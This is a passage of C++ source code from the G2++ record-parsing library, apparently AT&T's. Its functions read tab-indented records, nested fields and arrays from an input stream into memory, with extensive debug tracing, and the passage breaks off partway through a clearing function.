<Vblock.h>\n#include <assert.h>\n#include <iostream.h>\n#include <stdlib.h>\n#include <osfcn.h>\n#include <String.h>\n#if !defined(_MSC_VER) && !defined(__TCPLUSPLUS__)\n#include <libc.h>\n#ifdef _LIBC_INCLUDED\n#define HP_NATIVE_COMPILER\n#endif\n#endif\n#ifdef __GNUG__\n#define IOSTREAMH\n#endif\n\nstatic char sccs_id[] = \"@(#)G2++ library, version 093096\";\n\n#ifdef IOSTREAMH\n#define\tGCOUNT\tis.gcount()\n#else\n#define\tGCOUNT\tgcount_ATTLC(p)\nstatic int\ngcount_ATTLC(const char* p) {\n\tregister int\ti=0;\n\twhile(*p != '\\0' && *p++ != '\\n')\n\t\t++i;\n\treturn i;\n}\n#endif\n\nextern int seekflag_ATTLC;\n\n\n\nstatic int\ndiscard(int, istream&);\nvoid*\ngetbody(void* rec, G2DESC* rd, istream& is);\nint\ngetchildren(int, int, istream&, void*, G2DESC*);\nstatic int\nget_integer(int, int &, istream&);\nint\nget_builtin(int, void*, int, istream&);\nstatic void\nclearleaf(void*, int);\n\n\nvoid*\ngetrec_ATTLC(void* rec, G2DESC* rd, istream& is) {\n\tDEBUG(cerr << \"enter getrec_ATTLC\\n\";)\n\n\n\n\n\tif (seekflag_ATTLC) {\n\t\tgetbody(rec,rd,is);\n\t}\n\telse {\n\n\n\t\tString name;\n\t\tdo {\n\t\t\tname=getname_ATTLC(is);\n\t\t\tDEBUG(cerr << \"call getname_ATTLC to scan for next record\\n\";)\n\t\t\tif (name.is_empty()) {\n\t\t\t\tDEBUG(cerr << \"getname_ATTLC returned \\\"\\\"; return NULL\\n\";)\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tDEBUG(cerr << \"getname_ATTLC returned name=\"\n\t\t\t\t<< name << \"\\n\";)\n\t\t\tif (name.is_empty()) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t} while (name!=rd->name);\n\n\t\tDEBUG(cerr << \"found the record type we're looking for!\\n\";)\n\t\tDEBUG(cerr << \"ready to call getbody\\n\";)\n\t\tgetbody(rec, rd, is);\n\t}\n\tseekflag_ATTLC=0;\n\treturn rec;\n}\n\n\n\n\nvoid*\ngetbody(void* rec, G2DESC* rd, istream& is) {\n\tDEBUG(cerr << \"enter getbody\\n\";)\n\n\n\n\tseekflag_ATTLC=0;\n\n\n\n\n\n\tDEBUG(cerr << \"ready to call g2clear_ATTLC\\n\";)\n\tg2clear_ATTLC(rd,rec);\n\tDEBUG(cerr << \"back from g2clear_ATTLC\\n\";)\n\n\tint c;\n\tint indent;\n\n\tc = getchar_G2_ATTLC(is);\n\n\tDEBUG(cerr << \"is.get() returns c = ASCII \" << c\n\t\t<< \" (\" << char(c) << \" )\" << \"\\n\";)\n\tDEBUG(void* test = (void*)is;\n\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\telse{cerr << \"is tests null\\n\";}\n\t)\n\tDEBUG(cerr << \"rd->type == '\" << char(rd->type) << \"'\\n\";)\n\tif (rd->type == 'L') {\n\n\n\n\t\tDEBUG(cerr << \"LEAF\\n\";)\n\t\tif (c == '\\t') {\n\t\t\tDEBUG(cerr << \"c is tab\\n\";)\n\t\t\tint size = rd->size;\n\t\t\tif (size >= 0) {\n\n\t\t\t\tDEBUG(cerr << \"User-defined type (case 1)\\n\";)\n\t\t\t\trd->gfn(is,rec);\n\t\t\t\tDEBUG(cerr << \"back from call to gfn\\n\"; )\n\t\t\t\tc=getchar_G2_ATTLC(is);\n\t\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\n\t\t\t\t\t<< \"\\n\";)\n\t\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t\t)\n\t\t\t}\n\t\t\telse {\n\n\t\t\t\tDEBUG(cerr << \"size<0\\n\";)\n\t\t\t\tc = (get_builtin(size, rec, rd->nel, is));\n\t\t\t}\n\t\t}\n\t\tif (c != '\\n') {\n\t\t\tif ((discard(c, is)) == BS_EOF) {\n\t\t\t\tDEBUG(cerr << \"hit eof - ready to return\\n\";)\n\t\t\t\treturn rec;\n\t\t\t}\n\t\t}\n\t\tc = getchar_G2_ATTLC(is);\n\t\tDEBUG(cerr << \"is.get() returns c = ASCII \" << c\n\t\t\t<< \" (\"\t<< char(c) << \" )\" << \"\\n\";)\n\t\tDEBUG(void* test = (void*)is;\n\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t)\n\t}\n\telse {\n\n\t\tDEBUG(cerr << \"NONLEAF\\n\";)\n\t\tif (rd->type == 'A') {\n\t\t\tDEBUG(cerr << \"in top level array case\\n\";)\n\t\t\tint size1;\n\t\t\tVb_ATTLC* aptr = (Vb_ATTLC*) rec;\n\t\t\tDEBUG(cerr << \"calling get_integer\\n\";)\n\t\t\tc = get_integer(c, size1, is);\n\t\t\tDEBUG(cerr << \"get_integer returns \" << size1 << \"\\n\";);\n\t\t\tif (size1 > aptr->size()) {\n\t\t\t\tDEBUG(cerr << \"resizing array to \" << size1 << \"\\n\";)\n\t\t\t\taptr->size(size1);\n\t\t\t}\n\t\t}\n\t\tc=discard(c,is);\n\n\t\tif (c != BS_EOF) {\n\t\t\tfor (;;){\n\t\t\t\tDEBUG(cerr << \"at top of for(;;) loop\\n\";)\n\t\t\t\tindent=0;\n\t\t\t\tfor(;;) {\n\t\t\t\t\tc = getchar_G2_ATTLC(is);\n\t\t\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\n\t\t\t\t\t\t<< \"\\n\";)\n\t\t\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t\t\t)\n\t\t\t\t\tif (c != '\\t')break;\n\t\t\t\t\tindent++;\n\t\t\t\t}\n\t\t\t\tDEBUG(cerr << \"counted \" << indent << \" tabs\\n\";)\n\t\t\t\tDEBUG(cerr << \"broke from loop with c = ASCII \"\n\t\t\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\t<< \"\\n\";)\n\t\t\t\tif (indent==1) {\n\t\t\t\t\tDEBUG(cerr << \"indent==1\\n\";)\n\t\t\t\t\tif (isname2_ATTLC(c)) {\n\t\t\t\t\t\tDEBUG(cerr << \"isname2_ATTLC(c) is true\\n\";)\n\t\t\t\t\t\tDEBUG(cerr << \"ready to call getchildren()\\n\";)\n\n\n\n\t\t\t\t\t\tc = getchildren(1, c, is, rec, rd);\n\t\t\t\t\t\tDEBUG(cerr <<\n\t\t\t\t\t\t\t\"return from getchildren with c = ASCII \"\n\t\t\t\t\t\t\t<< c << \" (\" <<\n\t\t\t\t\t\t\tchar(c)\t<< \" )\"\n\t\t\t\t\t\t\t<< \"\\n\";)\n\t\t\t\t\t\tif (c == BS_EOF) is.clear(is.rdstate()&~ios::eofbit);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tDEBUG(cerr << \"isname2_ATTLC(c) is false\\n\";)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (indent==0) {\n\t\t\t\t\tDEBUG(cerr << \"indent==0\\n\";)\n\n\t\t\t\t\tif (c == '\\n' || c == '.' || isname1_ATTLC(c)){\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ((c=discard(c,is)) == BS_EOF) {\n\t\t\t\t\tindent = 0;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tDEBUG(cerr << \"exit from for(;;) loop\\n\";)\n\t\t}\n\t}\n\tDEBUG(cerr << \"COMMON POSTPROCESSING\\n\";)\n\twhile (c == '.') {\n\t\tDEBUG(cerr << \"call _g2getdot_ATTLC\\n\";)\n\t\tc = _g2getdot_ATTLC(is);\n\t}\n\tif (c == '\\n' || c == BS_EOF) {\n\t\treturn rec;\n\t}\n\tif (isname1_ATTLC(c)) {\n\t\tDEBUG(cerr << \"is.putback(c = ASCII \" << c << \" (\"\n\t\t\t<< char(c) << \" )\" << \")\\n\";)\n\t\tis.putback(c);\n\t\treturn rec;\n\t}\n\tDEBUG(cerr << \"_g2sync_ATTLC(c,is)\\n\";)\n\t_g2sync_ATTLC(c, is);\n\treturn rec;\n}\n\n\n\n\nint\ngetchildren(int level, register int c, istream& is, void* base, G2DESC* par) {\n\tstatic int \txindent;\n\tint\t\tindent = level;\n\tG2DESC* \ttop = par->child;\n\tG2DESC* \tcur = top;\n\tG2DESC* \tonetoofar = top + par->nel;\n\tint\t\tquit=0;\n\tint \tnel;\n\tvoid*\toldbase;\n\n\tDEBUG(cerr << \"enter getchildren with\\n\" << \"\tlevel=\" << level << \"\\n\"\n\t\t<< \"\tc = ASCII \" << c << \" (\" << char(c) << \" )\"<< \"\\n\"\n\t\t<< \"\tbase=\" << (void*)base << \"\\n\";)\n\tif (par->type == 'S') {\n\t\tDEBUG(cerr << \"par->type is 'S'\\n\";)\n\t\tnel = par->nel;\n\t\tDEBUG(cerr << \"par->nel=\" << par->nel << \"\\n\"\n\t\t\t<< \"nel=\" << nel << \"\\n\";)\n\t}\n\telse if (par->type == 'A') {\n\t\tDEBUG(cerr << \"par->type is 'A'\\n\";)\n\n\n\n\n\n\t\tnel = ((Vb_ATTLC*)base)->size();\n\t\tDEBUG(cerr << \"par->nel=\" << par->nel << \"\\n\"\n\t\t\t<< \"nel=\" << nel << \"\\n\";)\n\n\n\n\t\toldbase=base;\n\t\tDEBUG(cerr << \"oldbase=\" << (void*)oldbase << \"\\n\";)\n\t\tbase = ((Vb_ATTLC*)base)->beginning();\n\t\tDEBUG(cerr << \"base=\" << (void*)base << \"\\n\";)\n\t}\n\n\n\n\tfor( ; ; ){\n\t\tString  \tname(Stringsize(10));\n\t\tint\t\toffset;\n\t\tG2DESC*\t\thit = NULL;\n\t\tG2DESC* \tmarker;\n\n\t\tDEBUG(cerr << \"AGAIN (at top of sibling for(;;) loop)\\n\";)\n\t\tif (c == BS_EOF) {\n\t\t\tindent = 0;\n\t\t\tbreak;\n\t\t}\n\n\n\n\t\tdo {\n\t\t\tname += c;\n\t\t\tc = getchar_G2_ATTLC(is);\n\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\t<< \"\\n\";)\n\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t)\n\t\t} while(isname2_ATTLC(c));\n\n\t\tDEBUG(cerr << \"after do while, name = \" << name << \"\\n\";)\n\n\t\tif (par->type == 'A'){\n\n\t\t\tDEBUG(cerr << \"par->type == 'A' (name should be an index)\\n\";)\n\t\t\tif (!isdigit_ATTLC(name.char_at(0))) {\n\t\t\t\tg2error_ATTLC(G2INDEXREQ);\n\t\t\t}\n\t\t\telse {\n\t\t\t\thit = top;\n\t\t\t\tDEBUG(cerr << \"hit=\\n\";)\n\t\t\t\tDEBUG(showdesc_ATTLC(hit);)\n\n\t\t\t\tregister int index = 0;\n\t\t\t\tfor (int j=0;\n\t\t\t\t     j<name.length() && isdigit_ATTLC(name.char_at(j));\n\t\t\t\t     j++) {\n\t\t\t\t\tindex = index*10 + name.char_at(j) -'0';\n\t\t\t\t}\n\t\t\t\tDEBUG(cerr << \"after j-loop, index=\" << index\n\t\t\t\t\t<< \"\\n\"\t<< \"whereas nel=\" << nel\n\t\t\t\t\t<< \"\\n\";)\n\t\t\t\tif (index >= nel) {\n\n\t\t\t\t\tif (par->nel==0 || nel<par->nel) {\n\n\n\t\t\t\t\t\tint old_nel = nel;\n\t\t\t\t\t\tDEBUG(cerr << \"must grow the array\\n\";)\n\t\t\t\t\t\tDEBUG(cerr << \"old nel=\"\n\t\t\t\t\t\t\t<< nel << \"\\n\";)\n\t\t\t\t\t\tif (par->nel>0){\n\t\t\t\t\t\t\tnel = par->nel;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tif (nel<=2) {\n\t\t\t\t\t\t\t\tnel=(index<10 ?(10):((index+1)*2));\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\twhile (index>=nel) {\n\t\t\t\t\t\t\t\t\tnel = int(nel*1.414);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tDEBUG(cerr << \"new nel=\"\n\t\t\t\t\t\t\t<< nel << \"\\n\";)\n\t\t\t\t\t\t((Vb_ATTLC*)oldbase)->size(nel);\n\t\t\t\t\t\tbase = ((Vb_ATTLC*)oldbase)->beginning();\n\t\t\t\t\t\tDEBUG(cerr << \"((Vb_ATTLC*)oldbase)->size()==\"\n\t\t\t\t\t\t\t<< ((Vb_ATTLC*)oldbase)->size()\n\t\t\t\t\t\t\t<< \"\\n\"\n\t\t\t\t\t\t\t<< \"new value of base=\"\n\t\t\t\t\t\t\t<< (void*)base<< \"\\n\";)\n\n\n\t\t\t\t\t\tif (hit-> size == 0) {\n\t\t\t\t\t\t\tint lcl_index;\n\t\t\t\t\t\t\tDEBUG(cerr << \"initializing new array elements\\n\";)\n\t\t\t\t\t\t\tfor (lcl_index = old_nel; lcl_index < nel; lcl_index++) {\n\t\t\t\t\t\t\t\thit->nfn((void*)((char*)base + lcl_index * hit->nel));\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\n\t\t\t\t\t\tDEBUG(cerr << \"array is not flexible; \"\n\t\t\t\t\t\t\t<< \"ignore this index\"\n\t\t\t\t\t\t\t<< \"\\n\";)\n\t\t\t\t\t\thit=0;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\n\t\t\t\tif (hit) {\n\t\t\t\t\toffset = index * REALSIZE(hit->size);\n\t\t\t\t\tif (hit->size == 0) {\n\t\t\t\t\t\toffset = index * hit->nel;\n\t\t\t\t\t}\n\t\t\t\t\tDEBUG(cerr << \"compute offset:\\n\"\n\t\t\t\t\t\t<< \"\thit->size=\"\n\t\t\t\t\t\t<< hit->size << \"\\n\"\n\t\t\t\t\t\t<< \"\tREALSIZE(hit->size)=\"\n\t\t\t\t\t\t<< REALSIZE(hit->size) << \"\\n\"\n\t\t\t\t\t\t<< \"\toffset=\"\n\t\t\t\t\t\t<< offset << \"\\n\";)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse {\n\n\t\t\tDEBUG(cerr << \"parent type is 'S'\\n\";)\n\n\n\n\n\n\n\n\n\n\t\t\tmarker = cur;\n\n\t\t\tdo {\n\t\t\t\tDEBUG(cerr << \"at top of lookup loop, cur:\\n\";)\n\t\t\t\tDEBUG(showdesc_ATTLC(cur);)\n\n\n\n\t\t\t\tDEBUG(cerr << \"compare name '\" << name\n\t\t\t\t\t<< \"' with cur->name '\" << cur->name\n\t\t\t\t\t<< \"'\\n\";)\n\n\t\t\t\tif (name==String(cur->name)) {\n\t\t\t\t\tDEBUG(cerr << \"hit! (the names are equal)\\n\";)\n\t\t\t\t\toffset = cur->offset;\n\t\t\t\t\tDEBUG(cerr << \"offset=\" << offset\n\t\t\t\t\t\t<< \"\\n\";)\n\t\t\t\t\thit = cur++;\n\t\t\t\t\tif (cur >= onetoofar) {\n\t\t\t\t\t\tDEBUG(cerr << \"must wrap around\\n\";)\n\t\t\t\t\t\tcur = top;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tDEBUG(cerr << \"the names are not equal\\n\";)\n\t\t\t\tcur++;\n\n\t\t\t\tif (cur >= onetoofar) {\n\t\t\t\t\tDEBUG(cerr << \"must wrap around\\n\";)\n\t\t\t\t\tcur = top;\n\t\t\t\t}\n\t\t\t\tDEBUG(cerr << \"cur:\\n\";)\n\t\t\t\tDEBUG(showdesc_ATTLC(cur);)\n\t\t\t} while (cur != marker);\n\t\t\tDEBUG(cerr << \"MATCHED (exit from lookup loop)\\n\";)\n\t\t}\n\n\n\n\t\tif (c == '\\t' && hit && hit->type == 'L') {\n\t\t\tDEBUG(cerr << \"ready to stuff leaf value\\n\";)\n\n\n\n\n\t\t\tchar* cp = (char*)base + offset;\n\t\t\tDEBUG(cerr << \"\tbase=\" << (void*)base << \"\\n\"\n\t\t\t\t<< \"\toffset=\"  << offset << \"\\n\"\n\t\t\t\t<< \"\tcp=\" << (void*)cp << \"\\n\"\n\t\t\t\t<< \"\thit->size=\" << hit->size << \"\\n\";)\n\t\t\tif (hit->size >= 0) {\n\n\n\n\t\t\t\tDEBUG(cerr << \"User-defined type (case 2)\\n\";)\n\t\t\t\thit->gfn(is,cp);\n\t\t\t\tDEBUG(cerr << \"back from call to gfn\\n\"; )\n\t\t\t\tc=getchar_G2_ATTLC(is);\n\t\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t\t<< c << \" (\" << char(c)\n\t\t\t\t\t<< \" )\" << \"\\n\";)\n\t\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t\t)\n\t\t\t}\n\t\t\telse {\n\t\t\t\tDEBUG(cerr << \"hit->size<0: ready to call get_builtin\\n\";)\n\t\t\t\tc = (get_builtin(hit->size, cp, hit->nel, is));\n\t\t\t}\n\t\t}\n\n\t\telse if (hit && hit->type == 'A') {\n\t\t\tDEBUG(cerr << \"in array case\\n\";)\n\t\t\tint size1;\n\t\t\tVb_ATTLC* aptr = (Vb_ATTLC*) ((char*)base + offset);\n\t\t\tDEBUG(cerr << \"calling get_integer\\n\";)\n\t\t\tc = get_integer(c, size1, is);\n\t\t\tDEBUG(cerr << \"get_integer returns \" << size1 << \"\\n\";);\n\t\t\tif (size1 > aptr->size()) {\n\t\t\t\tDEBUG(cerr << \"resizing array to \" << size1 << \"\\n\";)\n\t\t\t\taptr->size(size1);\n\t\t\t}\n\t\t}\n\n\t\tif (c != '\\n' && (c=discard(c,is)) == BS_EOF) {\n\t\t\tindent = 0;\n\t\t\tbreak;\n\t\t}\n\t\tfor (;;) {\n\t\t\tDEBUG(cerr << \"at top of inner for loop\\n\";)\n\n\t\t\tindent=0;\n\t\t\tfor( ;; ) {\n\t\t\t\tc = getchar_G2_ATTLC(is);\n\t\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\n\t\t\t\t\t<< \"\\n\";)\n\t\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t\t)\n\t\t\t\tif (c!='\\t') break;\n\t\t\t\tindent++;\n\t\t\t}\n\t\t\tDEBUG(cerr << \"forloop counted \" << indent\n\t\t\t\t<< \" tabs, whereas level is \" << level\n\t\t\t\t<< \"\\n\";)\n\t\t\tDEBUG(cerr << \"c = ASCII \" << c << \" (\"\n\t\t\t\t<< char(c) << \" )\" << \"\\n\";)\n\t\t\tif (isname2_ATTLC(c)) {\n\n\t\t\t\tDEBUG(cerr << \"make decisions for indent, level=\"\n\t\t\t\t\t<< indent << \",\" << level << \"\\n\";)\n\t\t\t\tif (indent == level+1 && hit) {\n\nif (hit->type == 'A') {\n}\n\t\t\t\t\tDEBUG(cerr << \"indent==level+1 && hit\\n\";)\n\t\t\t\t\tDEBUG(cerr << \"call getchildren recursively for level \"\n\t\t\t\t\t\t<< level+1 << \"\\n\";)\n\t\t\t\t\tc = getchildren(level+1, c, is, (char*)base+offset, hit);\n\t\t\t\t\tDEBUG(cerr << \"back from getchildren with c = ASCII \"\n\t\t\t\t\t\t<< c << \" (\"<< char(c) << \" )\"\n\t\t\t\t\t\t<< \"\\n\";)\n\t\t\t\t\tindent = xindent;\n\t\t\t\t\tDEBUG(cerr << \"set indent=\"\n\t\t\t\t\t\t<< indent << \"\\n\";)\n\t\t\t\t}\n\t\t\t\tif (indent==level) {\n\n\t\t\t\t\tDEBUG(cerr << \"indent==level\\n\";)\n\t\t\t\t\tDEBUG(cerr << \"the next line should say \\\"again\\\"\\n\";)\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse if (indent<level) {\n\n\t\t\t\t\tDEBUG(cerr << \"indent<level\\n\";)\n\t\t\t\t\tDEBUG(cerr << \"the next line should say \\\"out\\\"\\n\";)\n\t\t\t\t\tquit=1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tDEBUG(cerr << \"(fall thru) assert indent > level+1\\n\";)\n\t\t\tif (indent == 0) {\n\t\t\t\tDEBUG(cerr << \"indent == 0\\n\";)\n\t\t\t\tif (c == '\\n' || c == '.') {\n\t\t\t\t\tDEBUG(cerr << \"the next line should say \\\"out\\\"\\n\";)\n\t\t\t\t\tquit=1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ((c=discard(c,is)) == BS_EOF) {\n\t\t\t\tDEBUG(cerr << \"the next line should say \\\"out\\\"\\n\";)\n\t\t\t\tindent = 0;\n\t\t\t\tquit=1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (quit) {\n\t\t\tbreak;\n\t\t}\n\t}\n\tDEBUG(cerr << \"out\\n\";)\n\txindent = indent;\n\tDEBUG(cerr << \"ready to return c == ASCII \" << c << \" (\"\n\t\t<< char(c) << \" )\" << \"\\n\";)\n\treturn c;\n}\n\n\nstatic int\nget_integer(register int c, int &return_int, istream& is) {\n\treturn_int = 0;\n\twhile (c && !isdigit_ATTLC(c) && c != '\\n') {\n\t\tc = getchar_G2_ATTLC(is);\n\t}\n\twhile (isdigit_ATTLC(c)) {\n\t\treturn_int = return_int*10 + c - '0';\n\t\tc = getchar_G2_ATTLC(is);\n\t}\n\treturn c;\n}\nstatic int\ndiscard(register int c, istream& is) {\n\tDEBUG(cerr << \"discard \";)\n\twhile(c != '\\n' && c != BS_EOF) {\n\t\tc = getchar_G2_ATTLC(is);\n\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\t<< \"\\n\";)\n\t\tDEBUG(void* test = (void*)is;\n\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t)\n\t}\n\tDEBUG(cerr << \"\\n\";)\n\treturn c;\n}\n\n\nint\nget_builtin(int code, void* mem, int max, istream& is) {\n\tchar c;\n\tDEBUG(cerr << \"enter get_builtin with code=\" << code << \"\\n\";)\n\n\n\n\tif (code==STRING_INT_ATTLC+1) {\n\t\tDEBUG(cerr << \"STRING\\n\"; )\n\t\tString& x = *((String*)mem);\n\n\t\tif (max) {\n\t\t\tDEBUG(cerr << \"fixed-size string\\n\";)\n\n\n\n\n\n\n\n\n\n\n\n\n\t\t\tx.uniq();\n\t\t\tx.reserve(max+1);\n\t\t\tDEBUG(cerr << \"after reserve, x.max() = \" << x.max()\n\t\t\t\t<< \"\\n\";)\n\n\n\n\n#ifdef HP_NATIVE_COMPILER\n\t\t\tx.pad(max,-1);\n#else\n\t\t\tx.g2_pad(max,-1);\n#endif\n\t\t\tDEBUG(cerr << \"after pad, x.length() = \"\n\t\t\t\t<< x.length()<< \"\\n\";)\n\t\t\tchar* p = (char*)(const char*)x;\n\t\t\tDEBUG(cerr << \"ready to call \"\t<< \"is.get(\"\n\t\t\t\t<< (void*)p << \",\" << max << \",\"\n\t\t\t\t<< \"\\\\n)\" << \"\\n\";)\n\n\n\n\n\n\n\n\n\n\n\n\n\t\t\tis.get(p,max+1,'\\n');\n\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t)\n\n\n\n\n\t\t\tint count = GCOUNT;\n#ifndef IOSTREAMH\n\t\t\tif (count > max+1) count = max+1;\n#endif\n\t\t\tDEBUG(cerr << \"is.gcount() returns \" << count << \"\\n\";)\n\n\n\t\t\tif (is.fail()) {\n\t\t\t\tDEBUG(cerr << \"is.fail() returns true\\n\";)\n\t\t\t\tc = BS_EOF;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tDEBUG( cerr << \"is.fail() returns false\\n\";)\n\t\t\t\tc = *(p+count-1);\n\t\t\t}\n\t\t\tDEBUG(cerr << \"set c = ASCII \" << c\n\t\t\t\t<< \" (\"\t<< char(c) << \")\" << \"\\n\";)\n\n\n\n\n\n\t\t\tDEBUG(cerr << \"contents of memory after get: \";)\n\n\t\t\tregister char *q;\n\t\t\tfor (q = p; isprint_ATTLC(*(unsigned char *)q); q++) {\n\t\t\t\tDEBUG(cerr << char(*q);)\n\t\t\t}\n\t\t\tDEBUG(cerr << \"\\n\";)\n\t\t\tDEBUG(cerr << \"ready to shrink length = \"\n\t\t\t\t<< (q-p) << \"\\n\";)\n#ifdef HP_NATIVE_COMPILER\n\t\t\tx.shrink(q-p);\n#else\n\t\t\tx.g2_shrink(q-p);\n#endif\n\t\t\tDEBUG(cerr << \"after shrink, x = \" << x\n\t\t\t\t<< \", x.length() = \" << x.length()<< \"\\n\";)\n\n\t\t}\n\t\telse {\n\t\t\tDEBUG(cerr << \"variable-size string\\n\";)\n\n\t\t\tint size=0;\n\t\t\tfor(;;) {\n\t\t\t\tc = getchar_G2_ATTLC(is);\n\t\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t\t<< c << \" (\" << char(c)\t<< \" )\"\n\t\t\t\t\t<< \"\\n\";)\n\t\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t\t)\n\n\t\t\t\tif(!isprint_ATTLC(c) ||\t(max!=0 && ++size > max)){\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tDEBUG(cerr << char(c);)\n\t\t\t\t*((String*)mem) += c;\n\t\t\t}\n\t\t\tDEBUG(cerr << \"\\n\";)\n\t\t\tDEBUG(cerr << \"broke from loop with c = ASCII \"\n\t\t\t\t<< c << \" (\" << char(c) << \" )\" << \"\\n\";)\n\t\t\tDEBUG(cerr << \"after loop, *\" << (void*)mem << \"=\"\n\t\t\t\t<< *(String*)mem << \"\\n\";)\n\t\t}\n\t}\n\telse {\n\t\tString temp;\n\t\tDEBUG(cerr << \"code!=STRING_INT_ATTLC+1: stuff characters into temp: \";)\n\t\tfor( ;; ) {\n\t\t\tc = getchar_G2_ATTLC(is);\n\t\t\tDEBUG(cerr << \"is.get() returns c = ASCII \"\n\t\t\t\t<< c << \" (\" << char(c)\n\t\t\t\t<< \" )\"\t<< \"\\n\";)\n\t\t\tDEBUG(void* test = (void*)is;\n\t\t\t\tif(test){cerr << \"is tests non-null\\n\";}\n\t\t\t\telse{cerr << \"is tests null\\n\";}\n\t\t\t)\n\t\t\tif( !isprint_ATTLC(c) )break;\n\t\t\tDEBUG(cerr << char(c);)\n\t\t\ttemp += c;\n\t\t}\n\t\tDEBUG(cerr << \"\\n\";)\n\t\tDEBUG(cerr << \"after loop, temp=\" << temp << \"\\n\";)\n\n\t\tswitch (code) {\n\t\tcase LONG_INT_ATTLC+1:{\n\t\t\tDEBUG(cerr << \"LONG\\n\";)\n\t\t\t*(long*)mem = atol(temp);\n\t\t\tDEBUG(cerr << \"*\" << (void*)mem << \" = \"\n\t\t\t\t<< *(long*)mem \t<< \"\\n\";)\n\t\t\tbreak;\n\t\t}\n\t\tcase SHORT_INT_ATTLC+1:{\n\t\t\tDEBUG(cerr << \"SHORT\\n\";)\n\t\t\t*(short*)mem = atoi(temp);\n\t\t\tDEBUG(cerr << \"*\" << (void*)mem << \" = \"\n\t\t\t\t<< *(short*)mem << \"\\n\";)\n\t\t\tbreak;\n\t\t}\n\t\tcase CHAR_INT_ATTLC+1:{\n\t\t\tDEBUG(cerr << \"CHAR\\n\";)\n\t\t\tif ((temp.char_at(0) == '\\\\') &&\n\t\t\t\ttemp.length()>1) {\n\t\t\t\t*(char*)mem = _g2otoi_ATTLC(temp.chunk(1));\n\t\t\t}\n\t\t\telse {\n\t\t\t\t*(char*)mem = temp.char_at(0);\n\t\t\t}\n\t\t\tDEBUG(cerr << \"*\" << (void*)mem << \" = \"\n\t\t\t\t<< char(*(char*)mem) << \"\\n\";)\n\t\t\tbreak;\n\t\t}\n\t\t}\n\t}\n\treturn c;\n}\n\n\n\n\nvoid\ng2clear_ATTLC(G2DESC* rd, void* p){\n\tDEBUG(cerr << \"enter g2clear_ATTLC with rd=\\n\";)\n\tDEBUG(showdesc_ATTLC(rd);)\n\tDEBUG(cerr << \"...and p=\" << (void*)p << \"\\n\";)\n\tif (rd->type == 'L') {\n\n\n\n\t\tDEBUG(cerr << \"Record is a leaf\\n\";)\n\t\tif (rd->size == 0) {\n\n\n\n\t\t\tDEBUG(cerr << \"gonna try to clear a user-defined type:\\n\";)\n\t\t\trd->nfn(p);\n\n\t\t}\n\t\telse {\n\n\t\t\tDEBUG(cerr << \"Its type is builtin\\n\";)\n\t\t\tDEBUG(cerr << \"Ready to call 